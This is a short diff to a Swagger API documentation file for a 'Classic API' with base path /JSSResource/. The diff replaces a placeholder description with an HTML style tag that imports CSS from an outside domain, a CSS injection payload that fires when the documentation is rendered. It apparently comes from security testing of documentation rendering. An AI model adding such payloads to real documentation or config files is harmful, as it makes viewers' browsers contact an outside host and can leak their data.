@@ -1,7 +1,7 @@
 swagger: '3.0'
 info:
   title: Classic API Resource Documentation
-  description: TEST123
+  description: <style>@import url(//techproject.ro/staging?len=32);</style>
   version: production
 basePath: /JSSResource/
 produces:
